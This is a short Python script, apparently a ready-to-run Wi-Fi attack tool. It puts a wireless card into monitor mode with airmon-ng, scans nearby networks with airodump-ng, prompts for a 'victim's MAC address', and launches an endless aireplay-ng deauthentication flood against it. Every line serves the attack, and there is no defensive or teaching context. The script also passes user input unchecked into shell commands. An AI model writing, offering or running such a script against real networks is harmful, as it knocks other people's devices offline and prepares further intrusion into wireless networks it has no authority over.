import os
import sys
import signal
import time



os.system("clear")
time.sleep(0.5)
os.system("sudo airmon-ng")
interface = input("Select interface: ")
os.system("sudo airmon-ng check kill")
os.system(f"sudo airmon-ng start {interface}")
print("To stop scanning, please press ctrl+c ")
os.system(f"sudo airodump-ng --output-format csv --write scan_results {interface}mon")
bssid = input("Enter victim's MAC address: ")

os.system(f"sudo aireplay-ng --deauth 0 -x 30 -a {bssid} {interface}mon")
